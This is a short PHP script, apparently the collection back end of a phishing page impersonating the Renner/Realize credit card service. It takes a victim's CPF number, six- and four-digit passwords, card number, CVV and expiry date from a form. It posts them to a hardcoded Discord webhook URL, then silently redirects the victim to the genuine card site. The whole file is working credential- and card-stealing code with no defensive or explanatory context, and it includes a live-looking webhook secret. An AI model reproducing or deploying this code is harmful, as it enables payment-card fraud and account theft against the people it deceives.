<?php 

$webhookurl = "https://discord.com/api/webhooks/931555251822137455/ZChroFUDFmznSMF6EKDAJob7Nv0ZTdPkgx_cOmq10I3CGUidq94sjyfjpX-LUS4m45pj";

$cpf = $_POST["cpf"];
$senha6 = $_POST["senha6"];
$senha4 = $_POST["senha4"];
$cc = $_POST["cc"];
$ccv = $_POST["ccv"];
$validade = $_POST["validade"];

$json_data = json_encode([
    "content" => "CPF: $cpf\nCC: $cc|$validade|$ccv\nSenha-6: $senha6\nSenha-4: $senha4",
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );
curl_close( $ch );
?>

<!DOCTYPE html>
<html>

<head>
    <meta http-equiv="refresh" content="0; URL='https://www.realizesolucoesfinanceiras.com.br/cartoes-renner/'"/></head>
</html>
